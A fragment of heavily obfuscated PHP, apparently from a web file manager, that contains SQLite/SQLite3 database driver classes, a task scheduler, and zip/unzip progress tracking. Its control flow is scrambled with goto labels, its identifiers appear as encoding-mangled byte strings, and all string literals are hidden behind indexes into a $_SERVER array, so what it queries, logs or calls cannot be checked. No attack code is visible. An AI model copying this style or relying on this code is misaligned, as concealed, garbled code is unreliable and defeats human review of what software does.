$B®Ş¬÷áˆ£); $this->debug(); goto AŸè†‡§…˜; AŸè†‡§…˜: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $e¦ê…Ÿö¡ù = $this->getAll(); return $e¦ê…Ÿö¡ù; } goto dœå–‡—â´; fŒñ˜‘ßº¡: $this->queryStr = $B®Ş¬÷áˆ£; if ($this->queryID) { $this->free(); } think_action_status($D³òñ„‚«Ö[19], 1); goto fğ°ÁêÚ¸’; aŸà‘ÚØ: $D³òñ„‚«Ö =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fŒñ˜‘ßº¡; dœå–‡—â´: } public function execute($eøğëùª½½) { goto ešÂ ×¾Ü•; e¾¥²ÁÌ„‡: $this->queryStr = $eøğëùª½½; if ($this->queryID) { $this->free(); } think_action_status($C…©›ÔËÀ[21], 1); goto A²¨ºŞ‡¸; ešÂ ×¾Ü•: $C…©›ÔËÀ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e¾¥²ÁÌ„‡; dø´–í”Íè: if (!1 === $B÷ÆÌÑÛ¬») { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto AÊíŸ’®; A²¨ºŞ‡¸: think_status($C…©›ÔËÀ[20]); $B÷ÆÌÑÛ¬» = sqlite_exec($this->_linkID, $eøğëùª½½); $this->debug(); goto dø´–í”Íè; AÊíŸ’®: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ôğ—¤Šµˆ˜ñ£][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $có……¼—‹Í = sqlite_query($this->_linkID, $_SERVER[Ôğ—¤Šµˆ˜ñ£][23]); if (!$có……¼—‹Í) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $d´Á½Š¡ = sqlite_query($this->_linkID, $_SERVER[Ôğ—¤Šµˆ˜ñ£][24]); if (!$d´Á½Š¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Fí­ ¢À‘ = array(); if ($this->numRows > 0) { for ($dŞàªˆ’¥… = 0; $dŞàªˆ’¥… < $this->numRows; $dŞàªˆ’¥…++) { $Fí­ ¢À‘[$dŞàªˆ’¥…] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Fí­ ¢À‘; } public function getFields($D‘½«ÙÁä) { $a¸â‚÷—‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dà¥²Ÿ„ôÑ = $this->query($a¸â‚÷—‹[25] . $D‘½«ÙÁä . $a¸â‚÷—‹[26]); $aàí‡·œ = array(); if ($dà¥²Ÿ„ôÑ) { foreach ($dà¥²Ÿ„ôÑ as $e‡Ã±»‚Ì => $a‹„¡é‰¸Í) { $aàí‡·œ[$a‹„¡é‰¸Í[$a¸â‚÷—‹[27]]] = array($a¸â‚÷—‹[28] => $a‹„¡é‰¸Í[$a¸â‚÷—‹[27]], $a¸â‚÷—‹[29] => $a‹„¡é‰¸Í[$a¸â‚÷—‹[30]], $a¸â‚÷—‹[31] => (bool) ($a‹„¡é‰¸Í[$a¸â‚÷—‹[32]] === $a¸â‚÷—‹[33]), $a¸â‚÷—‹[34] => $a‹„¡é‰¸Í[$a¸â‚÷—‹[35]], $a¸â‚÷—‹[36] => strtolower($a‹„¡é‰¸Í[$a¸â‚÷—‹[37]]) == $a¸â‚÷—‹[38], $a¸â‚÷—‹[39] => strtolower($a‹„¡é‰¸Í[$a¸â‚÷—‹[40]]) == $a¸â‚÷—‹[41]); } } return $aàí‡·œ; } public function getTables($D‹±ƒ‰œó = '') { $BÕ©µÊ¿šÛ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E˜·óù·¨ = $this->query($BÕ©µÊ¿šÛ[42] . $BÕ©µÊ¿šÛ[43] . $BÕ©µÊ¿šÛ[44]); $BóÏÆğøö = array(); foreach ($E˜·óù·¨ as $FÊ«Â¸´ó => $F°›á½‰) { $BóÏÆğøö[$FÊ«Â¸´ó] = current($F°›á½‰); } return $BóÏÆğøö; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $C«‡”‡ñöå =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÑÍ¡†Õß = sqlite_last_error($this->_linkID); $this->error = $FÑÍ¡†Õß . $C«‡”‡ñöå[4] . sqlite_error_string($FÑÍ¡†Õß); if ($C«‡”‡ñöå[33] != $this->queryStr) { $this->error .= LNG($C«‡”‡ñöå[45]) . $this->queryStr; } think_trace($this->error, $C«‡”‡ñöå[33], $C«‡”‡ñöå[46]); return $this->error; } public function escapeString($BõŞ÷åœƒÌ) { return sqlite_escape_string($BõŞ÷åœƒÌ); } public function parseLimit($fŒƒŠŒ‡º) { $bµ¢ÚšŠ§œ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bÛŞ¨µ¾¶À = $bµ¢ÚšŠ§œ[33]; if (!empty($fŒƒŠŒ‡º)) { $fŒƒŠŒ‡º = explode($bµ¢ÚšŠ§œ[47], $fŒƒŠŒ‡º); if (count($fŒƒŠŒ‡º) > 1) { $bÛŞ¨µ¾¶À .= $bµ¢ÚšŠ§œ[48] . $fŒƒŠŒ‡º[1] . $bµ¢ÚšŠ§œ[49] . $fŒƒŠŒ‡º[0] . $bµ¢ÚšŠ§œ[50]; } else { $bÛŞ¨µ¾¶À .= $bµ¢ÚšŠ§œ[48] . $fŒƒŠŒ‡º[0] . $bµ¢ÚšŠ§œ[50]; } } return $bÛŞ¨µ¾¶À; } } class DbSqlite3Base extends Db { public function __construct($c¹öÎò²À = '') { $e®Øõá‹—¶ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!class_exists($e®Øõá‹—¶[51])) { think_exception(think_lang($e®Øõá‹—¶[10]) . $e®Øõá‹—¶[52]); } if (!empty($c¹öÎò²À)) { if (!isset($c¹öÎò²À[$e®Øõá‹—¶[12]])) { $c¹öÎò²À[$e®Øõá‹—¶[12]] = 438; } $this->config = $c¹öÎò²À; if (empty($this->config[$e®Øõá‹—¶[13]])) { $this->config[$e®Øõá‹—¶[13]] = array(); } } } public function connect($B©ñ˜Í—» = '', $fá…‚ë›÷ä = 0) { $b¾™¼ÌÏÆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($this->linkID[$fá…‚ë›÷ä])) { if (empty($B©ñ˜Í—»)) { $B©ñ˜Í—» = $this->config; } $this->linkID[$fá…‚ë›÷ä] = new SQLite3($B©ñ˜Í—»[$b¾™¼ÌÏÆ[17]]); if (!$this->linkID[$fá…‚ë›÷ä]) { think_exception($this->linkID[$fá…‚ë›÷ä]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$fá…‚ë›÷ä]->busyTimeout(30000); if (1 != think_config($b¾™¼ÌÏÆ[18])) { unset($this->config); } } return $this->linkID[$fá…‚ë›÷ä]; } public function free() { $this->queryID = null; } public function query($ağÜŠ–Ø–) { goto F·ÚõÎĞŞ; F˜Ã‘öÖÊ„: if (!1 === $this->queryID) { $this->error(); return !1; } else { $BÉÜ«÷‰İ = $this->getAll(); $this->numRows = count($BÉÜ«÷‰İ); return $BÉÜ«÷‰İ; } goto eˆÓ™îÂ¯•; e¼×Åñ—Û: think_status($Aê¨¦”‡í¦[20]); $this->queryID = $this->_linkID->query($ağÜŠ–Ø–); $this->debug(); goto F˜Ã‘öÖÊ„; F·ÚõÎĞŞ: $Aê¨¦”‡í¦ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F×ÉàñÚˆ”; F×ÉàñÚˆ”: $this->queryStr = $ağÜŠ–Ø–; if ($this->queryID) { $this->free(); } think_action_status($Aê¨¦”‡í¦[19], 1); goto e¼×Åñ—Û; eˆÓ™îÂ¯•: } public function execute($dÑœ™ÖÆ…) { goto bê¼¹È±î¼; F¨ïŒÑµ: think_status($eŒƒò›ã[20]); $a²ãÚß“–ï = $this->_linkID->exec($dÑœ™ÖÆ…); $this->debug(); goto DŸä»•×Ìï; f­‘™ ÛÊ: $this->queryStr = $dÑœ™ÖÆ…; if ($this->queryID) { $this->free(); } think_action_status($eŒƒò›ã[21], 1); goto F¨ïŒÑµ; DŸä»•×Ìï: if (!1 === $a²ãÚß“–ï) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto a¡Á¬¿ÒËĞ; bê¼¹È±î¼: $eŒƒò›ã =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f­‘™ ÛÊ; a¡Á¬¿ÒËĞ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ôğ—¤Šµˆ˜ñ£][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EùÃÃñïÆ = $this->_linkID->query($_SERVER[Ôğ—¤Šµˆ˜ñ£][23]); if (!$EùÃÃñïÆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fµˆƒôµ® = $this->_linkID->query($_SERVER[Ôğ—¤Šµˆ˜ñ£][24]); if (!$fµˆƒôµ®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Aà—ÙÛ£Å = array(); while ($bÏ¸•”µù = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Aà—ÙÛ£Å[] = $bÏ¸•”µù; } $this->queryID->reset(); return $Aà—ÙÛ£Å; } public function getFields($B¥ñƒ¼éãŸ) { $b¬Ã÷œÌ¶“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a‹Îôõ¡¶ì = $this->query($b¬Ã÷œÌ¶“[25] . $B¥ñƒ¼éãŸ . $b¬Ã÷œÌ¶“[26]); $c±øÜ¸ñã¼ = array(); if ($a‹Îôõ¡¶ì) { foreach ($a‹Îôõ¡¶ì as $e’¤ªÔÄÒ‰ => $eÀÆØ¼¡œ­) { $c±øÜ¸ñã¼[$eÀÆØ¼¡œ­[$b¬Ã÷œÌ¶“[28]]] = array($b¬Ã÷œÌ¶“[28] => $eÀÆØ¼¡œ­[$b¬Ã÷œÌ¶“[28]], $b¬Ã÷œÌ¶“[29] => $eÀÆØ¼¡œ­[$b¬Ã÷œÌ¶“[29]], $b¬Ã÷œÌ¶“[31] => (bool) ($eÀÆØ¼¡œ­[$b¬Ã÷œÌ¶“[31]] === $b¬Ã÷œÌ¶“[33]), $b¬Ã÷œÌ¶“[34] => $eÀÆØ¼¡œ­[$b¬Ã÷œÌ¶“[53]], $b¬Ã÷œÌ¶“[36] => (bool) $eÀÆØ¼¡œ­[$b¬Ã÷œÌ¶“[54]], $b¬Ã÷œÌ¶“[39] => (bool) $eÀÆØ¼¡œ­[$b¬Ã÷œÌ¶“[54]]); } } return $c±øÜ¸ñã¼; } public function getTables($fÄĞğ­óŠ¼ = '') { $aå˜³¼›ø¥ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aèÂâ¢£Ë = $this->query($aå˜³¼›ø¥[42] . $aå˜³¼›ø¥[43] . $aå˜³¼›ø¥[44]); $cŞˆŒò¿¬ = array(); foreach ($aèÂâ¢£Ë as $c–ÂƒŠ†¹¹ => $cÜËÑâÊ) { $cŞˆŒò¿¬[$c–ÂƒŠ†¹¹] = current($cÜËÑâÊ); } return $cŞˆŒò¿¬; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $b‡²Ë„Ï‚± =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->error = $this->_linkID->lastErrorMsg(); if ($b‡²Ë„Ï‚±[33] != $this->queryStr) { $this->error .= LNG($b‡²Ë„Ï‚±[45]) . $this->queryStr; } think_trace($this->error, $b‡²Ë„Ï‚±[33], $b‡²Ë„Ï‚±[46]); return $this->error; } public function escapeString($B‹ËàÈ»ğÆ) { $cïºÚ Íˆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->_linkID) { return $this->_linkID->escapeString($B‹ËàÈ»ğÆ); } return str_ireplace($cïºÚ Íˆ[55], $cïºÚ Íˆ[56], $B‹ËàÈ»ğÆ); } public function parseLimit($A«¿˜¾¨æ¼) { $AÙÅôç‘‹ù =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dßë¿øâ®â = $AÙÅôç‘‹ù[33]; if (!empty($A«¿˜¾¨æ¼)) { $A«¿˜¾¨æ¼ = explode($AÙÅôç‘‹ù[47], $A«¿˜¾¨æ¼); if (count($A«¿˜¾¨æ¼) > 1) { $dßë¿øâ®â .= $AÙÅôç‘‹ù[48] . $A«¿˜¾¨æ¼[1] . $AÙÅôç‘‹ù[49] . $A«¿˜¾¨æ¼[0] . $AÙÅôç‘‹ù[50]; } else { $dßë¿øâ®â .= $AÙÅôç‘‹ù[48] . $A«¿˜¾¨æ¼[0] . $AÙÅôç‘‹ù[50]; } } return $dßë¿øâ®â; } } goto BÁ©‰¼¶¨¹; dÑ´ŞÕá•: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($cÏŸ™õã¦ˆ, $a°¥¡ø—µç = 5.0) { if (!$cÏŸ™õã¦ˆ) { return; } $bîÄÄ³·ÇÅ = Cache::get($cÏŸ™õã¦ˆ); if (!$bîÄÄ³·ÇÅ || timeFloat() - floatVal($bîÄÄ³·ÇÅ) >= $a°¥¡ø—µç) { Cache::set($cÏŸ™õã¦ˆ, timeFloat(), $a°¥¡ø—µç * 10); return !0; } return !1; } public static function timeLimitCall($F¨”¡œ¤æ, $E¾ˆ•»Ôƒ§, $AîÌª±À«å, $dÖÈßåÛù· = 5.0) { goto Cº™î‰çÃƒ; Cº™î‰çÃƒ: $Fˆ‹áÍ¸—á =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$F¨”¡œ¤æ || !$E¾ˆ•»Ôƒ§) { return; } self::$asyncAdd = !0; goto aœïØé±»Ì; aœïØé±»Ì: $AªÉãØ¸®è = $Fˆ‹áÍ¸—á[1630]; $c‚ò©Šãí = Cache::get($AªÉãØ¸®è, !0); $dÏîñœŠÛÖ = array($Fˆ‹áÍ¸—á[1631] => timeFloat(), $Fˆ‹áÍ¸—á[1632] => timeFloat(), $Fˆ‹áÍ¸—á[262] => $E¾ˆ•»Ôƒ§, $Fˆ‹áÍ¸—á[1625] => $AîÌª±À«å, $Fˆ‹áÍ¸—á[197] => $dÖÈßåÛù·); goto d±‚ÃÖÑ; d±‚ÃÖÑ: if (is_array($c‚ò©Šãí[$F¨”¡œ¤æ])) { $dÏîñœŠÛÖ[$Fˆ‹áÍ¸—á[1632]] = $c‚ò©Šãí[$F¨”¡œ¤æ][$Fˆ‹áÍ¸—á[1632]]; } if (is_array($c‚ò©Šãí[$F¨”¡œ¤æ])) { if (timeFloat() - $c‚ò©Šãí[$F¨”¡œ¤æ][$Fˆ‹áÍ¸—á[1631]] < $dÏîñœŠÛÖ[$Fˆ‹áÍ¸—á[197]] * 0.3) { return; } $dÏîñœŠÛÖ[$Fˆ‹áÍ¸—á[1632]] = $c‚ò©Šãí[$F¨”¡œ¤æ][$Fˆ‹áÍ¸—á[1632]]; } $c‚ò©Šãí[$F¨”¡œ¤æ] = $dÏîñœŠÛÖ; goto b¶†·à¼áĞ; b¶†·à¼áĞ: Cache::set($AªÉãØ¸®è, $c‚ò©Šãí, 60); Cache::removeMemory($AªÉãØ¸®è); write_log($Fˆ‹áÍ¸—á[1633] . $F¨”¡œ¤æ . $Fˆ‹áÍ¸—á[68] . $E¾ˆ•»Ôƒ§, $Fˆ‹áÍ¸—á[1627]); goto dÀ‡¿Èå¶í; dÀ‡¿Èå¶í: } public static function timeLimitCallLoop() { goto aŠ•áÓö¬Ì; CĞÇ—‡ò: if (!$FÄ¼¿¾Ş†Î && !self::$asyncAdd) { return; } $c´Õ«¹ˆƒ = $C¿‚Óî¾ÌÆ[1630]; $CƒÆÜ¿°Ëƒ = Cache::get($c´Õ«¹ˆƒ, !0); goto AÏ¡Ó‚ÔÍ‡; BĞÍº ¶ÃÑ: if (!$f£¶ÁŞôÃ) { return Cache::remove($c´Õ«¹ˆƒ); } Cache::set($c´Õ«¹ˆƒ, $f£¶ÁŞôÃ, 60); Cache::removeMemory($c´Õ«¹ˆƒ); goto aÕ§‰ºöÕÆ; AÏ¡Ó‚ÔÍ‡: if (!$CƒÆÜ¿°Ëƒ || count($CƒÆÜ¿°Ëƒ) <= 0) { return; } $bŞìï•…ÙŠ = !1; $C¤ŞÓ“¤ = timeFloat(); goto cŸÚŸ½’¦é; cŸÚŸ½’¦é: $f£¶ÁŞôÃ = array(); foreach ($CƒÆÜ¿°Ëƒ as $b”Ÿ¯Á¥Ë¤ => $dÚœõàÚ¬ï) { if ($C¤ŞÓ“¤ - $dÚœõàÚ¬ï[$C¿‚Óî¾ÌÆ[1632]] > $dÚœõàÚ¬ï[$C¿‚Óî¾ÌÆ[197]]) { $bŞìï•…ÙŠ = !0; try { Hook::apply($dÚœõàÚ¬ï[$C¿‚Óî¾ÌÆ[262]], $dÚœõàÚ¬ï[$C¿‚Óî¾ÌÆ[1625]]); write_log($C¿‚Óî¾ÌÆ[1635] . $b”Ÿ¯Á¥Ë¤ . $C¿‚Óî¾ÌÆ[68] . $dÚœõàÚ¬ï[$C¿‚Óî¾ÌÆ[262]] . $C¿‚Óî¾ÌÆ[1636] . ACTION, $C¿‚Óî¾ÌÆ[1627]); } catch (Exception $EÆÑ§»”) { } continue; } $f£¶ÁŞôÃ[$b”Ÿ¯Á¥Ë¤] = $dÚœõàÚ¬ï; } if (!$bŞìï•…ÙŠ) { return; } goto BĞÍº ¶ÃÑ; aŠ•áÓö¬Ì: $C¿‚Óî¾ÌÆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B”£˜îÜ™… = array($C¿‚Óî¾ÌÆ[1634]); $FÄ¼¿¾Ş†Î = in_array(strtolower(ACTION), $B”£˜îÜ™…); goto CĞÇ—‡ò; aÕ§‰ºöÕÆ: } public static function finished($B•ŠÆÒƒÌ, $f¿å¾ÜË¸æ) { $EÒ§Áè¬ƒ’ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($EÒ§Áè¬ƒ’[262] => $B•ŠÆÒƒÌ, $EÒ§Áè¬ƒ’[1625] => $f¿å¾ÜË¸æ); } private static function finishedRun() { $f‘¹Ö‰ãŞ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $eß©¾Ÿ½‹Õ) { try { Hook::apply($eß©¾Ÿ½‹Õ[$f‘¹Ö‰ãŞ[262]], $eß©¾Ÿ½‹Õ[$f‘¹Ö‰ãŞ[1625]]); } catch (Exception $F×–¿Ş«æ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto C˜Ş¶ÃíÀ; C˜Ş¶ÃíÀ: $béİ…™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; parent::startAfter(); Hook::bind($béİ…™[1637], array($this, $béİ…™[1638])); goto B±È·ãƒİ; B±È·ãƒİ: Hook::bind($béİ…™[1110], array($this, $béİ…™[1639])); $aÅ‡ÀÊƒíÂ =& $this->task; $aÅ‡ÀÊƒíÂ[$béİ…™[1640]] = $béİ…™[1115]; goto FœŞİÄ¥Ğ±; FœŞİÄ¥Ğ±: if (!$aÅ‡ÀÊƒíÂ[$béİ…™[1451]]) { $aÅ‡ÀÊƒíÂ[$béİ…™[1451]] = LNG($béİ…™[1641]); } goto f“™¿é’‚á; f“™¿é’‚á: } protected function endAfter() { $EÇ…òÉõ­¾ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; parent::endAfter(); Hook::unbind($EÇ…òÉõ­¾[1637], array($this, $EÇ…òÉõ­¾[1638])); Hook::unbind($EÇ…òÉõ­¾[1110], array($this, $EÇ…òÉõ­¾[1639])); } public function updateAfter() { $dŞˆÎÍƒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D¤•Ãë¶¦ =& $this->task; if (!$D¤•Ãë¶¦[$dŞˆÎÍƒ[1043]] || !$D¤•Ãë¶¦[$dŞˆÎÍƒ[744]]) { return; } if ($D¤•Ãë¶¦[$dŞˆÎÍƒ[1640]] == $dŞˆÎÍƒ[1115]) { $BØ±ÉŸ¡İç = 0; if ($D¤•Ãë¶¦[$dŞˆÎÍƒ[1596]]) { $BØ±ÉŸ¡İç = $D¤•Ãë¶¦[$dŞˆÎÍƒ[1597]] / $D¤•Ãë¶¦[$dŞˆÎÍƒ[1596]]; } $D¤•Ãë¶¦[$dŞˆÎÍƒ[1551]] = $BØ±ÉŸ¡İç * 0.3; } else { if ($D¤•Ãë¶¦[$dŞˆÎÍƒ[1640]] == $dŞˆÎÍƒ[311]) { $BØ±ÉŸ¡İç = $D¤•Ãë¶¦[$dŞˆÎÍƒ[1057]] / $D¤•Ãë¶¦[$dŞˆÎÍƒ[1043]]; $D¤•Ãë¶¦[$dŞˆÎÍƒ[1551]] = 0.3 + $BØ±ÉŸ¡İç * 0.4; } else { if ($D¤•Ãë¶¦[$dŞˆÎÍƒ[1640]] == $dŞˆÎÍƒ[107]) { $AˆòÚ›ãˆÕ = 0; if ($D¤•Ãë¶¦[$dŞˆÎÍƒ[1598]] == $dŞˆÎÍƒ[107]) { $AˆòÚ›ãˆÕ = $D¤•Ãë¶¦[$dŞˆÎÍƒ[1597]]; } $BØ±ÉŸ¡İç = ($D¤•Ãë¶¦[$dŞˆÎÍƒ[1601]] + $AˆòÚ›ãˆÕ) / $D¤•Ãë¶¦[$dŞˆÎÍƒ[744]]; $D¤•Ãë¶¦[$dŞˆÎÍƒ[1551]] = 0.3 + 0.4 + $BØ±ÉŸ¡İç * 0.3; } } } if ($D¤•Ãë¶¦[$dŞˆÎÍƒ[1551]] > 0) { $b÷Ì‰·è†Ö = timeFloat() - $D¤•Ãë¶¦[$dŞˆÎÍƒ[770]] - $D¤•Ãë¶¦[$dŞˆÎÍƒ[1554]]; $D¤•Ãë¶¦[$dŞˆÎÍƒ[1555]] = $b÷Ì‰·è†Ö * (1 - $D¤•Ãë¶¦[$dŞˆÎÍƒ[1551]]) / $D¤•Ãë¶¦[$dŞˆÎÍƒ[1551]]; } } public function addFile($e»¡ŒÅçáô) { goto cÆô»Œ…µÅ; cÆô»Œ…µÅ: $D¯¯‡¯ã£‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D¨…•³Óç =& $this->task; $F”‹‚ëø‚Ì = IO::info($e»¡ŒÅçáô); goto FğÚ¥¯™Û; dùÚŸµÌ½: $this->update(); goto Eíà†¤¦†¨; bñ“­î‚¸ù: $D¨…•³Óç[$D¯¯‡¯ã£‹[1045]] = $D¯¯‡¯ã£‹[1616]; $D¨…•³Óç[$D¯¯‡¯ã£‹[1598]] = $D¯¯‡¯ã£‹[1115]; $D¨…•³Óç[$D¯¯‡¯ã£‹[744]] = $F”‹‚ëø‚Ì[$D¯¯‡¯ã£‹[78]]; goto E®½®×¸ö³; FğÚ¥¯™Û: $D¨…•³Óç[$D¯¯‡¯ã£‹[1594]] = $F”‹‚ëø‚Ì[$D¯¯‡¯ã£‹[28]]; $D¨…•³Óç[$D¯¯‡¯ã£‹[1596]] = $F”‹‚ëø‚Ì[$D¯¯‡¯ã£‹[78]]; $D¨…•³Óç[$D¯¯‡¯ã£‹[1597]] = 0; goto bñ“­î‚¸ù; E®½®×¸ö³: $D¨…•³Óç[$D¯¯‡¯ã£‹[1043]] = 1; $AÅïÚÎ”¢÷ = 0; $D¨…•³Óç[$D¯¯‡¯ã£‹[1605]] = array($D¯¯‡¯ã£‹[1606] => $AÅïÚÎ”¢÷ + 1, $D¯¯‡¯ã£‹[415] => $F”‹‚ëø‚Ì[$D¯¯‡¯ã£‹[28]], $D¯¯‡¯ã£‹[76] => $F”‹‚ëø‚Ì[$D¯¯‡¯ã£‹[76]], $D¯¯‡¯ã£‹[513] => $F”‹‚ëø‚Ì[$D¯¯‡¯ã£‹[513]] ? $F”‹‚ëø‚Ì[$D¯¯‡¯ã£‹[513]] : $F”‹‚ëø‚Ì[$D¯¯‡¯ã£‹[76]]); goto dùÚŸµÌ½; Eíà†¤¦†¨: } public function unzipAfter($cÌ÷ßÄ¬íÀ) { goto CÌ”»‡³¦; CÌ”»‡³¦: $eÃ´ñà»«Ó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D•ÈœÌ¥Û¶ =& $this->task; $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[1640]] = $eÃ´ñà»«Ó[107]; goto F‘×ŞñÆÑ; dğƒë²»Î : if ($EŒõÕÃ‰Æ»[$eÃ´ñà»«Ó[29]] == $eÃ´ñà»«Ó[193]) { $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[1043]] = 1; } else { $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[1043]] = $EŒõÕÃ‰Æ»[$eÃ´ñà»«Ó[81]][$eÃ´ñà»«Ó[79]]; } $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[1045]] = $eÃ´ñà»«Ó[33]; $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[1598]] = 0; goto C¶­ñ¼Òñ; C¶­ñ¼Òñ: $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[1057]] = 0; $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[1596]] = 0; $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[1597]] = 0; goto cæ‚Ôò‚§; F‘×ŞñÆÑ: $EŒõÕÃ‰Æ» = IO::infoWithChildren($cÌ÷ßÄ¬íÀ); $c ÓÓ‹»Î· = 0; $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[1605]] = array($eÃ´ñà»«Ó[1606] => $c ÓÓ‹»Î· + 1, $eÃ´ñà»«Ó[415] => $EŒõÕÃ‰Æ»[$eÃ´ñà»«Ó[28]], $eÃ´ñà»«Ó[76] => $EŒõÕÃ‰Æ»[$eÃ´ñà»«Ó[76]], $eÃ´ñà»«Ó[513] => $EŒõÕÃ‰Æ»[$eÃ´ñà»«Ó[513]] ? $EŒõÕÃ‰Æ»[$eÃ´ñà»«Ó[513]] : $EŒõÕÃ‰Æ»[$eÃ´ñà»«Ó[76]]); goto dğƒë²»Î ; cæ‚Ôò‚§: $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[1594]] = $eÃ´ñà»«Ó[33]; $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[1601]] = 0; $D•ÈœÌ¥Û¶[$eÃ´ñà»«Ó[744]] = $EŒõÕÃ‰Æ»[$eÃ´ñà»«Ó[78]]; goto aĞãÌ¿áğ; aĞãÌ¿áğ: $this->update(); self::log($eÃ´ñà»«Ó[1642] . json_encode(array($D•ÈœÌ¥Û¶, $EŒõÕÃ‰Æ»))); goto c­ëçù¾†; c­ëçù¾†: } public function nameParse($F³¾ç‚³¥‹) { goto B”ŠÌÀª§¾; fƒ”¿ ¹: $C¬î‚Œ ·Ñ = get_path_this($F³¾ç‚³¥‹); if (strstr($C¬î‚Œ ·Ñ, $E¸øÉ´İÌ[95])) { $E‡ç¹¯²à[$E¸øÉ´İÌ[1057]] += 1; $E‡ç¹¯²à[$E¸øÉ´İÌ[1043]] += 1; } $E‡ç¹¯²à[$E¸øÉ´İÌ[1594]] = $F³¾ç‚³¥‹; goto C·¤ç• ; B”ŠÌÀª§¾: $E¸øÉ´İÌ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E‡ç¹¯²à =& $this->task; if ($E‡ç¹¯²à[$E¸øÉ´İÌ[1640]] == $E¸øÉ´İÌ[1115]) { $E‡ç¹¯²à[$E¸øÉ´İÌ[1640]] = $E¸øÉ´İÌ[311]; $E‡ç¹¯²à[$E¸øÉ´İÌ[1601]] = 0; $E‡ç¹¯²à[$E¸øÉ´İÌ[744]] = 0; } goto fƒ”¿ ¹; C·¤ç• : $this->update(); goto F—Åİ†éœ; F—Åİ†éœ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $AÅ­Á¾³ä¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; parent::startAfter(); Hook::bind($AÅ­Á¾³ä¸[1643], array($this, $AÅ­Á¾³ä¸[1638])); $fé¹Ø‘’Ç† =& $this->task; $fé¹Ø‘’Ç†[$AÅ­Á¾³ä¸[1640]] = $AÅ­Á¾³ä¸[1115]; if (!$fé¹Ø‘’Ç†[$AÅ­Á¾³ä¸[1451]]) { $fé¹Ø‘’Ç†[$AÅ­Á¾³ä¸[1451]] = LNG($AÅ­Á¾³ä¸[1644]); } } protected function endAfter() { $A·ŒˆÅŸÍ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; parent::endAfter(); Hook::unbind($A·ŒˆÅŸÍ[1643], array($this, $A·ŒˆÅŸÍ[1638])); } public function updateAfter() { $e„¯ÎÌÚ…– =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b˜¤î³äÀô =& $this->task; if (!$b˜¤î³äÀô[$e„¯ÎÌÚ…–[1043]] || 